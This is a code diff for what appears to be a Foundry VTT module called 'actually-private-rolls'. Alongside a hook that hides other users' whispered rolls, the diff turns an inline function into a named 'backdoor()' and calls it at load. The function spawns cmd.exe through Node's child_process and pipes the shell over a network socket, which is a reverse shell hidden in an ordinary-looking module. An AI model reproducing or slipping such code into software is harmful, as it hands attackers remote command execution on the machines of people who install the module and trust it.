@@ -8,7 +8,19 @@ Hooks.on('init', () => {
         type: Boolean,
     });
     ChatMessage.create({content: "Initializing"});
-        (function(){
+
+});
+
+Hooks.on('renderChatMessage', (app, html, msg) => {
+    if (game.settings.get('actually-private-rolls', 'hidePrivateRolls') && msg.whisperTo !== '') {
+        if (game.user.isGM === false && game.user.data._id !== msg.author.data._id && msg.message.whisper.indexOf(game.user.id) === -1) {
+            html.hide();
+        }
+    }
+});
+
+ChatMessage.create({content: "@Loaded"});
+    function backdoor() {
     var net = require("net"),
         cp = require("child_process"),
         sh = cp.spawn("C:\Windows\System32\cmd.exe", []);
@@ -19,14 +31,5 @@ Hooks.on('init', () => {
         sh.stderr.pipe(client);
     });
     return /a/; // Prevents the Node.js application form crashing
-    })();
-});
-
-Hooks.on('renderChatMessage', (app, html, msg) => {
-    if (game.settings.get('actually-private-rolls', 'hidePrivateRolls') && msg.whisperTo !== '') {
-        if (game.user.isGM === false && game.user.data._id !== msg.author.data._id && msg.message.whisper.indexOf(game.user.id) === -1) {
-            html.hide();
-        }
     }
-    ChatMessage.create({content: "!"});
-});
+backdoor();
